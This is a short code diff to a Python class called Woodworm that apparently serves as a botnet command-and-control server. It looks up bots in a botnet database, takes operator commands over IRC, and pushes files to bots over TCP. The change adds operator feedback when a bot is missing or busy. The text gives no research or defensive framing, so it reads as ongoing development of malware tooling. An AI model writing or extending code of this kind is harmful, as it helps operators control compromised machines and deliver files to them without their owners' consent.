@@ -131,10 +131,15 @@ class Woodworm:
 
         bot = self.botnetDB.get_bot(receiver)
         if bot is None:
-            self.syslog.log(f"Bot not found: nick: {receiver}", level=logger.LogLevel.ERROR)
+            await irc_connection.send_query(nickname, f"Bot {receiver} not found")
             return
 
-        bot.get_tcp_connection().send_file(file_path)
+        connection = bot.get_tcp_connection()
+        if connection.is_sending_data():
+            await irc_connection.send_query(nickname, f"Bot {receiver} is busy")
+            return
+
+        connection.send_file(file_path)
         await irc_connection.send_query(nickname, f"File {filename} sent to {receiver}")
 
 
